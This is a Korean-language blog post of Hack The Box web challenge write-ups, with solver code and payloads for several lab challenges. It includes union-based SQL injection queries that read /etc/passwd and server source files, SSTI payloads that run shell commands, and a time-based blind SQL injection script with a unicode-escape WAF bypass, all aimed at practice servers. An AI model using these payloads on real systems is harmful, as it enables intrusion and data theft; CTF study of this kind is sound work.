---
layout: post
date: 2021-02-06 00:00:10
title: "HTB Write Up"
categories: WARGAME
tags: [WEB]
author:
  - Jeongwon Jo

---
## <span style="color:#21C587"></span> (Web) Emdee five for life [20 pts]

> Emdee five for life 문제는 웹으로 위장한 간단한 알고리즘 문제입니다.

```python
import requests
import hashlib

port = int(input("Enter the Port : "))
url = "http://docker.hackthebox.eu:{}/".format(port)
_res, _resLEN, index, FLAG =  [], 0, 0, ""
sess = requests.session()

def Parse(URL):
	global _res, _resLEN
	res = sess.get(URL)
	print("Type : {}".format(type(res)))
	_res = res.text.split('>')
	_resLEN = len(_res)

def Find_Index(LEN):
	global index
	for i in range(0, LEN+1):
		if "<h3" in _res[i]:
			index = i
			break

def _Flag(INDEX):
	FLAG = _res[INDEX+1]
	FLAG = FLAG.split('<')[0]
	FLAG = hashlib.md5(FLAG.encode('utf-8')).hexdigest()
	print("[+] md5 : {}".format(FLAG))
	print("==========================================================================")
	flag = {'hash':FLAG}
	res = sess.post(url, data=flag)
	print("Success!! Get the Flag")
	print("==========================================================================")
	DATA = res.text.split(">")
	for i in range(0, len(DATA)):
		if "HTB" in DATA[i]:
			print("FLAG : {}".format(DATA[i].split("<")[0]))
			break
	print("==========================================================================")

if __name__ == '__main__':
	print("[+] Start")
	Parse(url)
	Find_Index(_resLEN)
	_Flag(index)
```

> FLAG : HTB{N1c3_ScrIpt1nG_B0i!}

---
## <span style="color:#21C587"></span> (Web) FreeLancer [30 pts]

> FreeLancer 문제는 SQL Injection을 이용해서 내부 서버의 파일을 릭하고, 해당 파일에서 또 다른 파일에 정보를 얻어 해당 파일을 읽는 문제입니다.

```
1 or 1=1 
1 union select null, null, null
0 union select null, null, database()
0 union select null, null, table_name information_schema.tables where table_schema='freelancer'
0 union select null, username, password from safeadmin
0 union select null, null, load_file('/etc/passwd')
0 union select null, null, load_file('/var/www/html/administrat/index.php')
0 union select null, null, load_file('/var/www/html/administrat/panel.php')
```
사용한 쿼리는 위와 같습니다.<br>

- 시나리오<br>

1. 소스 코드를 보면 `<!-- <a href="portfolio.php?id=3">Portfolio 3</a> -->`를 볼 수 있다. id 파라미터를 이용해서 포트폴리오를 조회하는 로직인데 여기서 SQL Injection 취약점이 일어난다.
2. 쿼리 값에 결과를 웹 페이지에 그대로 출력해주기 때문에 Union Based SQL Injection 공격을 할 수 있다. 처음에는 이를 이용해서 테이블, 컬럼, 레코드 값을 모두 뽑아보았지만 중요한 정보를 얻을 수 없었다. 그래서 혹시나 해서 `LOAD_FILE` 함수를 이용해서 `/etc/passwd` 파일을 릭하니 잘 됐다.
3. 혹시나 다른 Path가 있을 거 같아 DIRB를 이용해서 디렉터리를 탐색하니 `/administrat`가 같은 디렉터리가 존재하는 것을 알 수 있었다. 해당 경로로 접속하니 바로 로그인 창이 뜨는 것을 보고, `index.php`를 사용하고 있는 거 같다는 생각이 들었다.
4. `LOAD_FILE` 함수를 이용해서 `/var/www/html/adminstrat/index.php` 파일을 릭 했다. 코드를 분석해보니 `header("location: panel.php");`를 보고 곧장 panel.php 파일도 릭을 했는데 해당 파일에 FLAG가 있었다.<br>

> FLAG : HTB{s4ff_3_1_w33b_fr4__l33nc_3}

---
## <span style="color:#21C587"></span> (Web) Templated [20 pts]

> Templated 문제는 제목에서 볼 수 있듯이 템플릿을 사용하고 있기 때문에 SSTI 취약점을 이용하는 문제입니다.

```
{{7*7}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.mro()[1].__subclasses__()[index]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
{{''.__class__.mro()[1].__subclasses__()[index]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
```
사용한 페이로드는 위와 같습니다.<br>

- 시나리오<br>

1. 문제 서버에서 404 에러 페이지에서 SSTI 취약점이 발생한다.
2. SSTI 취약점을 이용해서 RCE로 FLAG를 얻을 수 있다.<br>

> FLAG : HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}

---
## <span style="color:#21C587"></span> (Web) wafwaf [40 pts]

> wafwaf 문제는 SQL Injection 취약점을 이용해서 FLAG를 긁어오는 문제입니다. 문제에서 SQL Injection 방화벽이 설정되어 있지만, 방화벽에서 `json_decode` 함수를 이용해서 디코딩을 하고 값을 반환해준다. 이를 이용해서 Unicode Escape 문자를 이용해서 우회할 수 있습니다.

```python
from requests import post
from time import time
from json import dumps

url = "http://178.128.35.180:32000"
headers = {'content-type': 'application/json'}
payload = {"user":""}

def json_update(query_, mode):
	payload['user'] = query_
	Json = dumps(payload).replace("\\\\", "\\")
	if mode == '1':
		print("[*] Json Data : {}".format(Json))
	return Json


def get_request(query, mode, string, Len):
	if mode == '1':
		first_time = time()
		res = post(url, data=json_update(query, '1'), headers=headers)
		second_time = time()
		if res.text:
			print("[*] Response Content : {}".format(res.text))
		else:
			print("[*] Response Content : None")
		print("[*] Sleep : {}\n-".format(second_time - first_time))
	elif mode == '2':
		for i in range(100):
			first_time = time()
			if i < 10:
				unicode_ = "\\u003" + str(i)
			elif i >= 10 and i < 20:
				unicode_ = "\\u0031\\u003" + str(i)[1]
			elif i >= 20 and i < 30:
				unicode_ = "\\u0032\\u003" + str(i)[1]
			elif i >= 30 and i < 40:
				unicode_ = "\\u0033\\u003" + str(i)[1]
			elif i >= 40 and i < 50:
				unicode_ = "\\u0034\\u003" + str(i)[1]
			elif i >= 50 and i < 60:
				unicode_ = "\\u0035\\u003" + str(i)[1]
			elif i >= 60 and i < 70:
				unicode_ = "\\u0036\\u003" + str(i)[1]
			elif i >= 70 and i < 80:
				unicode_ = "\\u0037\\u003" + str(i)[1]
			elif i >= 80 and i < 90:
				unicode_ = "\\u0038\\u003" + str(i)[1]
			elif i >= 90 and i < 100:
				unicode_ = "\\u0039\\u003" + str(i)[1]
			else:
				unicode_ = "\\u0031\\u0030\\u0030"
			post(url, data=json_update(query.format(unicode_),'0'), headers=headers)
			second_time = time()

			if second_time - first_time >= 4.9:
				print("[*] Sleep : {}".format(second_time - first_time))
				print("[*] {} : {}\n-".format(string,i))
				break
	elif mode == '3':
		result = ''
		for j in range(1, Len + 1):
			unicode__ = "\\u003" + str(j)
			for i in range(33, 128):
				if i >= 33 and i < 40:
					unicode_ = "\\u0033\\u003" + str(i)[1]
				elif i >= 40 and i < 50:
					unicode_ = "\\u0034\\u003" + str(i)[1]
				elif i >= 50 and i < 60:
					unicode_ = "\\u0035\\u003" + str(i)[1]
				elif i >= 60 and i < 70:
					unicode_ = "\\u0036\\u003" + str(i)[1]
				elif i >= 70 and i < 80:
					unicode_ = "\\u0037\\u003" + str(i)[1]
				elif i >= 80 and i < 90:
					unicode_ = "\\u0038\\u003" + str(i)[1]
				elif i >= 90 and i < 100:
					unicode_ = "\\u0039\\u003" + str(i)[1]
				elif i >= 100 and i < 110:
					unicode_ = "\\u0031\\u0030\\u003" + str(i)[2]
				elif i >= 110 and i < 120:
					unicode_ = "\\u0031\\u0031\\u003" + str(i)[2]
				elif i >= 120 and i < 130:
					unicode_ = "\\u0031\\u0032\\u003" + str(i)[2]
				else:
					unicode_= "\\u0031\\u0033\\u003" + str(i)[2]
				first_time = time()
				post(url, data=json_update(query.format(unicode__, unicode_),'0'), headers=headers)
				second_time = time()

				if second_time - first_time >= 4.9:
					result += chr(i)
					break
		print("[*] {} : {}".format(string, result))
		print("-")

def main():
	get_request("\\u0027\\u0020\\u006f\\u0072\\u0020\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u0023", '1', '', 0)
	get_request("\\u0027\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0028\\u0064\\u0061\\u0074\\u0061\\u0062\\u0061\\u0073\\u0065\\u0028\\u0029\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023",'2', 'Database Length', 0)
	get_request("\\u0027\\u0020\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0061\\u0073\\u0063\\u0069\\u0069\\u0028\\u0073\\u0075\\u0062\\u0073\\u0074\\u0072\\u0028\\u0064\\u0061\\u0074\\u0061\\u0062\\u0061\\u0073\\u0065\\u0028\\u0029\\u002c{}\\u002c\\u0031\\u0029\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023", '3', 'Database', 8)
	get_request("\\u0027\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u0063\\u006f\\u0075\\u006e\\u0074\\u0028\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u006e\\u0061\\u006d\\u0065\\u0029\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0069\\u006e\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u002e\\u0074\\u0061\\u0062\\u006c\\u0065\\u0073\\u0020\\u0077\\u0068\\u0065\\u0072\\u0065\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u003d\\u0027\\u0064\\u0062\\u005f\\u006d\\u0038\\u0034\\u0035\\u0032\\u0027\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023", '2', "select count(*) information_schema.tables where table_schema='db_m8452';",0)
	get_request("\\u0027\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0028\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u006e\\u0061\\u006d\\u0065\\u0029\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0069\\u006e\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u002e\\u0074\\u0061\\u0062\\u006c\\u0065\\u0073\\u0020\\u0077\\u0068\\u0065\\u0072\\u0065\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u003d\\u0027\\u0064\\u0062\\u005f\\u006d\\u0038\\u0034\\u0035\\u0032\\u0027\\u0020\\u006c\\u0069\\u006d\\u0069\\u0074\\u0020\\u0030\\u002c\\u0031\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023", "2", "select length(table_name) from information_schema.tables where table_schema='db_m8452' limit 0,1", 0)
	get_request("\\u0027\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0061\\u0073\\u0063\\u0069\\u0069\\u0028\\u0073\\u0075\\u0062\\u0073\\u0074\\u0072\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u006e\\u0061\\u006d\\u0065\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0069\\u006e\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u002e\\u0074\\u0061\\u0062\\u006c\\u0065\\u0073\\u0020\\u0077\\u0068\\u0065\\u0072\\u0065\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u003d\\u0027\\u0064\\u0062\\u005f\\u006d\\u0038\\u0034\\u0035\\u0032\\u0027\\u0020\\u006c\\u0069\\u006d\\u0069\\u0074\\u0020\\u0030\\u002c\\u0031\\u0029\\u002c{}\\u002c\\u0031\\u0029\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023","3","First Table",21)
	get_request("\\u0027\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0028\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u006e\\u0061\\u006d\\u0065\\u0029\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0069\\u006e\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u002e\\u0074\\u0061\\u0062\\u006c\\u0065\\u0073\\u0020\\u0077\\u0068\\u0065\\u0072\\u0065\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u003d\\u0027\\u0064\\u0062\\u005f\\u006d\\u0038\\u0034\\u0035\\u0032\\u0027\\u0020\\u006c\\u0069\\u006d\\u0069\\u0074\\u0020\\u0031\\u002c\\u0031\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023", '2',"select length(table_name) from information_schema.tables where table_schema='db_m8452' limit 1,1", 0)
	get_request("\\u0027\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0061\\u0073\\u0063\\u0069\\u0069\\u0028\\u0073\\u0075\\u0062\\u0073\\u0074\\u0072\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u006e\\u0061\\u006d\\u0065\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0069\\u006e\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u002e\\u0074\\u0061\\u0062\\u006c\\u0065\\u0073\\u0020\\u0077\\u0068\\u0065\\u0072\\u0065\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u003d\\u0027\\u0064\\u0062\\u005f\\u006d\\u0038\\u0034\\u0035\\u0032\\u0027\\u0020\\u006c\\u0069\\u006d\\u0069\\u0074\\u0020\\u0031\\u002c\\u0031\\u0029\\u002c{}\\u002c\\u0031\\u0029\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023","3","Second Table", 5)
	get_request("\\u0027\\u0020\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0028\\u0063\\u006f\\u006c\\u0075\\u006d\\u006e\\u005f\\u006e\\u0061\\u006d\\u0065\\u0029\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0069\\u006e\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u002e\\u0063\\u006f\\u006c\\u0075\\u006d\\u006e\\u0073\\u0020\\u0077\\u0068\\u0065\\u0072\\u0065\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u006e\\u0061\\u006d\\u0065\\u003d\\u0027\\u0064\\u0065\\u0066\\u0069\\u006e\\u0069\\u0074\\u0065\\u006c\\u0079\\u005f\\u006e\\u006f\\u0074\\u005f\\u0061\\u005f\\u0066\\u006c\\u0061\\u0067\\u0027\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023","2", "Column Length (feat definitely_not_a_flag)", 0)
	get_request("\\u0027\\u0020\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0061\\u0073\\u0063\\u0069\\u0069\\u0028\\u0073\\u0075\\u0062\\u0073\\u0074\\u0072\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u0063\\u006f\\u006c\\u0075\\u006d\\u006e\\u005f\\u006e\\u0061\\u006d\\u0065\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0069\\u006e\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0073\\u0063\\u0068\\u0065\\u006d\\u0061\\u002e\\u0063\\u006f\\u006c\\u0075\\u006d\\u006e\\u0073\\u0020\\u0077\\u0068\\u0065\\u0072\\u0065\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u005f\\u006e\\u0061\\u006d\\u0065\\u003d\\u0027\\u0064\\u0065\\u0066\\u0069\\u006e\\u0069\\u0074\\u0065\\u006c\\u0079\\u005f\\u006e\\u006f\\u0074\\u005f\\u0061\\u005f\\u0066\\u006c\\u0061\\u0067\\u0027\\u0029\\u002c{}\\u002c\\u0031\\u0029\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023","3","Column (feat definitely_not_a_flag)",4)
	get_request("\\u0027\\u0020\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0028\\u0066\\u006c\\u0061\\u0067\\u0029\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0064\\u0065\\u0066\\u0069\\u006e\\u0069\\u0074\\u0065\\u006c\\u0079\\u005f\\u006e\\u006f\\u0074\\u005f\\u0061\\u005f\\u0066\\u006c\\u0061\\u0067\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023","2","flag length",0)
	get_request("\\u0027\\u0020\\u006f\\u0072\\u0020\\u0069\\u0066\\u0028\\u0061\\u0073\\u0063\\u0069\\u0069\\u0028\\u0073\\u0075\\u0062\\u0073\\u0074\\u0072\\u0028\\u0028\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0020\\u0066\\u006c\\u0061\\u0067\\u0020\\u0066\\u0072\\u006f\\u006d\\u0020\\u0064\\u0065\\u0066\\u0069\\u006e\\u0069\\u0074\\u0065\\u006c\\u0079\\u005f\\u006e\\u006f\\u0074\\u005f\\u0061\\u005f\\u0066\\u006c\\u0061\\u0067\\u0029\\u002c{}\\u002c\\u0031\\u0029\\u0029\\u003d{}\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0030\\u0029\\u0023", "3", "FLAG", 33)


if __name__ == "__main__":
	print("[*] Start\n-")
	main()
```

> FLAG : HTB{w4f_w4fing_my_w4y_0utt4_h3r3}

---
## <span style="color:#21C587"></span> (Web) interdimensional internet [30 pts]

> 귀차니즘.

---
## <span style="color:#21C587"></span> (Web) Under Construction [30 pts]

> 귀차니즘.

---
## <span style="color:#21C587"></span> (Web) baby ninja jinja [30 pts]

> 귀차니즘.

---
## <span style="color:#21C587"></span> (Web) nginxatsu [40 pts]

> 귀차니즘.

---
## <span style="color:#21C587"></span> (Web) Phonebook [30 pts]

> 귀차니즘.

---
## <span style="color:#21C587"></span> (Web) Weather App [30 pts]

> 귀차니즘.

---
